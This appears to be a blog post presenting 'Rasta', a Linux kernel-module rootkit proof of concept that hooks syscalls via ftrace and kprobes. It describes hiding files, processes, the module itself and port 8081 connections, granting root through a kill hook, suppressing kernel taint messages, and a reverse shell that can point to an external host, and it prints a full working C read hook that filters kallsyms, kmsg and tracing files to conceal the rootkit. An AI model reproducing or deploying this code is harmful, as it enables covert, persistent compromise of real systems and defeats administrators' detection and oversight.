---
title: "Linux Kernel Module POC"
date: 2025-01-25 00:00:00 +0000
categories: [Linux, Kernel Hacking]
tags: [LKM, malware, kernel-hacking]
description: Simple POC of a Linux kernel module for latest kernel version that utilizes both ftrace and kprobes and poses as a rootkit to stealthily hook its syscalls and leave no trace!
---

# RastaMon Linux Kernel Module
🇯🇲

## Core Capabilities

Rasta has the following core capabilities:

* **Hide Files and Directories Named `rasta`**  
   Rasta uses the `getdents64` syscall hook to hide all files and directories named `rasta` from userspace. This is particularly useful for obfuscating the presence of the module in the filesystem.
  
* **Remove/Add Module from `/proc/modules` List**  
   The module can remove itself from the `/proc/modules` list, making it difficult for userspace tools like `lsmod` to detect its presence. It can also add itself back into the list when necessary.

* **Gain Root Capabilities**  
   By hooking the `hooked_kill` syscall, Rasta can set all process IDs (UIDs, GIDs, etc.) to 0, giving the module root privileges. This enables full control over the system.

* **Hide `taint` Messages from `dmesg` or `/dev/kmsg`**  
   Rasta hides any kernel `taint` messages that would typically show up in `dmesg` or `/dev/kmsg`. This helps to cover up any traces of kernel modifications, making the rootkit harder to detect.

* **Hide from `/sys/module/` Directory**  
   The module hides itself from the `/sys/module` directory, preventing any attempts to manually detect or unload the module. This is achieved by manipulating the syscalls without actually deleting the module directory, making it invisible while still active.

* **Filter Module's Functions from `/sys/kernel/tracing/touched_functions` and `/proc/kallsyms`**  
   Rasta hooks `hooked_read` to filter out its own functions from being listed in `/sys/kernel/tracing/touched_functions` and `/proc/kallsyms`. This ensures that Rasta’s presence and behavior remain hidden in the kernel's symbol table and tracing logs.

* **Hiding Processes by PID**  
   Rasta hooks into the `getdents64` syscall to hide processes' PIDs, making it difficult for any monitoring tools to identify running processes associated with Rasta. This feature is still under development, but the goal is to ensure processes related to the rootkit remain stealthy.

* **Hiding Network Connections on Port 8081**  
   Rasta hooks two critical TCP APIs—`tcp4_seq_show` and `tcp6_seq_show`—using **ftrace** to hide any network connections on port 8081. This prevents tools like `netstat`, `lsof` and `ss` from displaying active connections on this port, ensuring covert communication for purposes like reverse shells.
   
* **Reverse Shell**  
   Rasta features a basic reverse shell that listens on a specified IP address (defaults to `localhost`). This shell can be configured to connect to an external IP address, providing a remote shell that remains hidden by the network connection.

---

* Quick shout to some [sources](#resources).   

---

## Examples

### Resetting the `taint_mask` to 0

![taintmask](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/taint_mask.jpg?raw=true)

* This demonstrates how Rasta manipulates the kernel's taint mask, effectively resetting it to 0.

---

### Hiding `taint` from `/dev/kmsg`

![taint](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/dmesg.jpg?raw=true)

* Here, the `taint` message is hidden from `/dev/kmsg`, meaning any errors or warnings about the module loading won’t appear in the kernel log.

---

### Hiding All of Our Functions from `/proc/kallsyms` and `/sys/kernel/tracing/touched_functions`

![antitrace](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/hide.jpg?raw=true)

* The `hooked_read` function is used to hide Rasta's functions from `/proc/kallsyms` and `/sys/kernel/tracing/touched_functions`. This ensures that the functions used by Rasta are never exposed to user space.

---

### Setting All IDs to 0

![root](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/root.jpg?raw=true)

* By using the `hooked_kill` syscall, Rasta sets all process IDs (UIDs, GIDs, etc.) to 0, effectively giving the kernel module root privileges.

---

### Adding/Removing the Module from the `/proc/modules` List

![lsmod](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/lsmod.jpg?raw=true)

* This shows how Rasta can add or remove itself from the `/proc/modules` list. The module can be removed to hide its presence from userspace, while still being active in the kernel.

---

### Hiding Everything Named `rasta`

![hideDir](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/getdents64.jpg?raw=true)

* The `getdents64` hook hides all files and directories named `rasta` from userspace. This is a stealth technique to ensure that the module’s presence is not detected through file listings or directory searches.

* **Note**: Technically, we don’t need to delete the module from `/sys/module/` because it won’t show up in directory listings due to the `getdents64` hook. While the directory is still there, it is hidden from userspace, making it hard to detect.

---

### Hiding Processes' PIDs

![PID](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/PID.jpg?raw=true)

* The `getdents64` and `kill` hooks are also used to hide the process IDs (PIDs) of userspace processes. Currently, there are some issues with completely hiding PIDs, but SIGKILL is sent to the process.

---

### Hiding TCP Connections on Port 8081

![tcp](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/tcp.jpg?raw=true)

* One of the key features of Rasta is the ability to **hide network connections**. Specifically, we hook into two critical APIs: `tcp4_seq_show` and `tcp6_seq_show` using **ftrace**. These two functions are responsible for displaying information about IPv4 and IPv6 TCP connections in userspace.

* By intercepting these calls, Rasta can **hide** any active TCP connections on port 8081 from tools like `netstat` or `ss`. This ensures that network activity, such as reverse shells or other types of communication using port 8081, remains invisible to standard network monitoring tools.

* The core mechanism works by:
   1. **Hooking** the `tcp4_seq_show` and `tcp6_seq_show` functions.
   2. **Filtering out any connection** on port 8081 (or any other port you wish to target) from being listed.
   3. This method provides a stealthy way to maintain network communications without detection.

---

### Reverse Shell

![shell](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/tcp.jpg?raw=true)

* This is a simple reverse shell that listens for connections on `localhost`. The IP address can be easily changed in `kprobe/rev-shell.h` to connect to an external host.
* The reverse shell utilizes the **hidden network connection** on port 8081, which is stealthed by Rasta's ftrace hook, allowing for covert communication.

---

### Using `notrace` example to avoid `/sys/kernel/tracing/available_filter_functions` with our read hook

```c
/*
        Big Collab with MatheuZSecurity on this https://github.com/matheuZSecurity/Rootkit/Ring0/clear-taint-dmesg
*/

#ifndef READ_H
#define READ_H

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*og_read)(const struct pt_regs *regs); // Pointer to the original read function

static asmlinkage ssize_t hooked_read(const struct pt_regs *regs);

// Hooked function that intercepts the syscall read
static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    static int spoof_next_read = 0; // Used to spoof one read

    // Check if the fd is from /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
	    
      /* Check if the file is:
	       	- /dev/kmsg 
	        - /proc/kallsyms
      	 	- /sys/kernel/tracing/enabled_functions
      	 	- /sys/kernel/tracing/touched_functions
      	 	- /sys/kernel/tracing/tracing_on
      	 	- /proc/sys/kernel/ftrace_enabled */
	
	
        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0 ||
	          strcmp(file->f_path.dentry->d_name.name, "enabled_functions") == 0) {
            
            fput(file); // Frees the file object after verification

            // Allocates a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                printk(KERN_ERR "Failed to allocate temporary buffer.\n");
                return -ENOMEM;
            }

            // Calls the original function to read data from the file
            bytes_read = og_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            // Copies data read from user space to the buffer in the kernel for processing
            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

	    // If the current val is "1" we need to spoof it, change it to "0" once. If not the zeros are so bad bro ...
            if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
                kernel_buf[0] = '0';
                spoof_next_read = 1; // Ensure spoof happens only once
            } else {
                spoof_next_read = 0; // Reset spoof
            }

            // Filter out lines that contain the words "taint", "rasta", or "kallsyms"
            char *filtered_buf = kzalloc(B_F, GFP_KERNEL); // Buffer for filtered messages
            if (!filtered_buf) {
                kfree(kernel_buf);
                return -ENOMEM;
            }

            char *line, *line_ptr;
            size_t filtered_len = 0;

            // Process the kernel buffer, line by line
            line = kernel_buf;
            while ((line_ptr = strchr(line, '\n'))) {
                *line_ptr = '\0';  // Temporarily terminate the line

            /*
                So check it out, this is where the magic happens with hiding from those tracing files. 
            */

                // Check if the line contains "taint", "rasta", or "kallsyms" 
                if (!strstr(line, "taint") && !strstr(line, "rasta") && !strstr(line, "kallsyms")) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < B_F) {  // Check for space in the filtered buffer
                        strcpy(filtered_buf + filtered_len, line);  // Append the line
                        filtered_len += line_len;
                        filtered_buf[filtered_len++] = '\n';  // Add newline after the line
                    }
                }

                line = line_ptr + 1;  // Move to the next line
            }

            // Ensures the final buffer is null-terminated
            filtered_buf[filtered_len] = '\0';

            // Copy the filtered buffer back to userspace
            if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
                kfree(kernel_buf);
                kfree(filtered_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            kfree(filtered_buf);
            return filtered_len;
        }

        fput(file); // Frees the file object if it's neither /dev/kmsg /proc/kallsyms, nor /sys/kernel/tracing/touched_functions
    }

    return og_read(regs); // Calls the original reading function if it's not /dev/kmsg, /proc/kallsyms or /sys/kernel/tracing/touched_functions
}

#endif
```

### Protecting Ftrace From Being Disabled and Spoofing the read to always return a zero when on. Basically Masking Ftrace Being Enabled.

![ftrace](https://github.com/fs3cs0ciety/linux-rootkit/blob/main/.img/ftrace.jpg?raw=true)

## Extra

> [!Important]  
> Not responsible for anything done with this. This does not do anything really malicious honestly and If you're dumb enough to think this is FUD malware, just go away.

### Resources:
* [Detect-Rootkit-Cheatsheet](https://github.com/MatheuZSecurity/detect-lkm-rootkit-cheatsheet)
* [Rootkit by matheuZSecurity](https://github.com/matheuZSecurity/Rootkit)
* [Linux Rootkit Series by fs3cs0ciety](https://github.com/fs3cs0ciety/Linux-Rootkit-Series)
* [Xcellerator's blog](https://xcellerator.github.io/)
* [The Linux Kernel Source](https://github.com/torvalds/linux)

### Arch Setup (if you're wondering):

* [Dotfiles by mylinuxforwork](https://github.com/mylinuxforwork/dotfiles)

